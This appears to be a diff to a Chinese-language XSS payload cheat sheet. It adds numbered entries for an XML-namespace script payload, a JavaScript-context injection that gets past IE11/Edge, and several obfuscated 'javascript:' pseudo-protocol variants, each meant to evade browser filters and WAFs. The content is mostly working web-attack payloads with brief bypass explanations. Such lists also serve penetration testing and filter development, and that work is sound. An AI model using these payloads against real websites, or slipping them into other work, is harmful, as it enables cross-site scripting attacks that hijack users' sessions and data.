@@ -497,9 +497,24 @@ javascript://https://DOMAIN/%250A1?alert(1):0
 ```
 **70.XML-Based Vector for Bypass (基于XML的绕过)** <br>
 以下payload用于在XML网页中绕过浏览器筛选和WAF。<br>
-如果输入插入到了注释节点中，则在payload前加一个"->"，如果输入落在`CDATA`节中，则在有效负载前加一个`]]>`。
+如果输入插入到了注释节点中，则在payload前加一个"->"，如果输入落在`CDATA`节中，则在有效负载前加一个`]]>`。<br>
 ```
 <_:script xmlns:_="http://www.w3.org/1999/xhtml">alert(1)</_:script>
+```
+**71.Javascript Context - Code Injection (IE11/Edge Bypass) (Javascript上下文-代码注入（IE11/Edge 绕过）)** <br>
+以下payload用于在注入javascript上下文时,绕过Microsoft IE11或Edge浏览器。 <br>
+```
+"'>confirm&lpar;1)</Script><Svg><Script/1='
+```
+**72.Javascript Pseudo-Protocol Obfuscation (Javascript伪协议混淆)** <br>
+用于绕过查找`javascript:alert(1)`的筛选器。在添加`alert(1)`之前，请确保它可以与"1"成功弹窗,这个payload可能需要一些额外的模糊处理,通过url编码,才能完全绕过过滤器。最后一个选项仅适用于payload的DOM操作（例如在基于位置的payload或基于DOM的XSS中）。<br>
+```
+javas&#99ript:1
+javascript&colon;1
+javascript&#9:1
+&#1javascript:1
+"javas%0Dcript:1"
+%00javascript:1
 ```
 
 ## 致谢
